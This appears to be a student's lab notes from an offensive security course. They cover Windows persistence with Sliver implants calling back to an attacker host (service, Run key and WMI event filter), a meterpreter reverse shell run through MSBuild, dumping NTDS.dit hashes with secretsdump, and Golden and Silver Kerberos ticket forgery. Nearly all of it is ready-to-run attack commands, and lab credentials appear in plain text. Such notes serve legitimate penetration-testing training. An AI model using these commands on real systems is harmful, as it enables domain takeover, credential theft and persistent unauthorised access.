1: Setup Sliver to Receive Connections
```
sudo sliver-server
https
```

2: Generate Sliver Payloads for Persistence.
Notice that we can create a service format. This format will properly respond to the service controller and will not die after 30 seconds.

Let's create two payloads, one for a service and then one for a standard executable.
```
generate --os windows --arch 64bit --skip-symbols --format service --name service --http https://LINUX_ETH0_ADDRESS
generate --os windows --arch 64bit --skip-symbols --format exe --name payload --http https://LINUX_ETH0_ADDRESS
```

3: Transfer files to Windows
Change the exe file ownership to the sec560 user and then confirm ownership of the files.

```
sudo chown sec560:sec560 *.exe*

python3 -m http.server

#on windows:
cd Desktop
curl.exe -s http://LINUX_ETH0_ADDRESS:8000/payload.exe -o payload.exe
curl.exe -s http://LINUX_ETH0_ADDRESS:8000/service.exe -o service.exe
```

4: Service Persistence
```
sc.exe create persist binpath= "c:\Users\sec560\Desktop\service.exe" start= auto
```

5: HKCU Run Persistence
```
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /t REG_SZ /F /D "C:\Users\sec560\Desktop\payload.exe"
```

The options for the command are:

reg — the command to run.
add — add a key.
"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" — the location to add the key.
/V "User Persist" — name of the key (Value).
/t REG_SZ — type String.
/F — force, overwrite if it exists.
/D "C:\Users\sec560\Desktop\payload.exe" — data, the executable to run.
We could have used HKLM (HKEY Local Machine) instead, and this would work for any user logging to the system, but it requires elevated access to use this key. We are using HKCU (HKEY Current User) so that it doesn't require elevated access.

6: WMI Event Filter Persistence
WMI Event Filters allow for a lot of flexibility on how to trigger our payload. We are going to setup an event listener for a failed login (event ID 4625) for the user fakeuser. This will allow us to trigger our payload for a failed login for a non-existent user!

We'll use the PowerShell commands below to setup the filter.

There are three parts to the setup.

The first command we will use will setup the Event Filter -Class __EventFilter with a name of UPDATER. The query then looks for failed logins (Event ID 4625) where the login matches fakeuser.
The second piece sets up the consumer, or what to do when the filter matches. In this case we are going to have matches to our UPDATER filter run our payload located at C:\Users\sec560\Desktop\payload.exe.
The final piece sets up the binding to look for the trigger and run our consumer (payload).
The commands here are quite complicated. Please copy and paste these commands into your administrative PowerShell prompt.

```
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = "UPDATER"; Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625' And Targetinstance.Message Like '%fakeuser%'"; QueryLanguage = 'WQL'}

$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = "UPDATER"; CommandLineTemplate = "C:\Users\sec560\Desktop\payload.exe"}

$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}
```

Now that we've setup the filter, switch to Linux, open a new terminal and attempt to login with smbclient and our fakeuser. It make take a while for the filter to detect the login. You may need to wait up to a minute.

`smbclient --password=badpassword '\\WINDOWS_ETHERNET0_ADDRESS\c$' -U fakeuser`

You can see that this gives SYSTEM level access on Windows. If we were to lose access all we would need to do is attempt to login as the non-existent fakeuser again to get a new session.

The method we used here is manual and somewhat complicated, and it is important to understand the basics of how this works. However, there are other options to do this more easily:

Metasploit — use the windows/local/wmi_persistence module.
Empire — use the persistence/elevated/wmi module.
Let's remove this filter, the binding, and the consumer using the existing PowerShell window you have open.

## MsBuild

Can input msbuild execution and run it:
```
# find msbuild:
ls C:\Windows msbuild.exe -Recurse 2>$null | % FullName

#running against an msbuild to execute:
C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe C:\CourseFiles\build1.xml
```

Can input meterpreter shellcode in msbuild process to run a meterpreter:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 3333
run AutoLoadExtensions=stdapi

#msfvenom to generate payload:
msfvenom -p windows/meterpreter/reverse_tcp lhost=eth0 lport=3333 -f csharp | tee /tmp/payload.txt
```

Place in the msbuild build2.xml for shellcode

## Domain Dominance

1: Establishing a shell on DC01
`wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4`

2: Looking at Shadow Copies
```
vssadmin.exe list shadows
#You may see output like this. If so, note the ID number of the HarddiskVolumeShadowCopyX; your number may be different!

#Create a Shadow Copy
vssadmin create shadow /for=c:

#Creating a copy of ntds.dit and the System Hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\extract\ntds.dit

#In order to extract hashes from the NTDS.dit file, we will need the encryption key in the system hive. Backup the registry with the command below (this can take a minute or two to complete):

reg save hklm\system c:\extract\system /y
#Copy the ntds.dit file to your machine
smbclient.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4
use c$
cd extract
get ntds.dit
get system
exit
```
6: Extracting hashes
`secretsdump.py -ntds ~/labs/ntds.dit -system ~/labs/system -outputfile /tmp/hashes.txt LOCAL`

## Golden Ticket

1: Extract secrets of the krbtgt account
```
secretsdump.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 -just-dc-user krbtgt
```

2: Retrieve domain information to create the Golden Ticket
```
wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 ipconfig /all
lookupsid.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 520
```

3: Create a Golden Ticket
Use the ticketer.py script with the following options:

- domain: the target domain name is hiboxy.com.
- domain-sid: The target domain SID (Security Identifier).
- aesKey: We will create a golden ticket using the AES key (either the AES128 or AES256 key will work) we previously stole.

Finally, we specify we want to create a golden ticket for the Administrator account.

`ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ -aesKey REPLACETHISfe23e25fcdedb15e520a95489c8be946a52554 Administrator 2>/dev/null`

4: Using the Golden Ticket
```
kerberos::ptt C:\bin\ticket.kirbi

#on linux:
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com hostname
```

5: Another Ticket
forging a user and ID:
```
ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ -aesKey REPLACETHISfe23e25fcdedb15e520a95489c8be946a52554 pwned 2>/dev/null
export KRB5CCNAME=pwned.ccache
wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com whoami
```

## Silver Ticket

1: Preparation
Now, let's configure DNS to query 10.130.10.4 for ONLY hiboxy.com.
`Add-DnsClientNrptRule -Namespace "hiboxy.com" -NameServers 10.130.10.4`

2: Getting the Information to Build a Ticket
```
lookupsid.py hiboxy.com/bgreen:Password1@10.130.10.4 520
secretsdump.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 -just-dc-user file01$
```

3: Creating the Ticket with Rubeus
We're going to use Rubeus for this lab. Rubeus is a toolset (written in C#) for interacting with and manipulating Kerberos.

Here are the options we are going to use with Rubeus:

- silver: The Silver Ticket feature in Rubeus.
- /service:cifs/file01.hiboxy.com: We are going to be targeting the cifs (Common Internet File System is a dialect of SMB, which is used with fileshares).
- /aes256:AES256_HASH_FROM_secretsdump.py: We are going to generate the ticket using the AES256 hash output from secretsdump.py.
- /sid:S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ: The SID from lookupsid.py.
- /ptt: Load the ticket into memory so we can use it.
- /user:bgreen: The user we are going to present in the ticket.

```
Rubeus.exe silver /service:cifs/file01.hiboxy.com /aes256:REDACTED_AES256_HASH /sid:S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ /ptt /user:bgreen
```

4: A Second Forged Ticket
Let's create a new ticket, but let's modify it even more!

With the previous ticket, we gave administrative permissions to bgreen (Domain Admins, Enterprise Admins, and more). We're now going to fake the username and the RID!

```
Rubeus.exe silver /service:cifs/file01.hiboxy.com /aes256:REDACTED_AES256_HASH /sid:S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ /ptt /user:pwned /id:777
```

The "serviceclass" is the part of the ticket before the FQDN (fully qualified domain name) of file01.hiboxy.com. In the previous example, we use the serviceclass cifs. Each service class allows us to connect to a different service. Let's create one for a different serviceclass that allows us to query the remote system's event log. Use the same information in this ticket, but replace cifs with host.

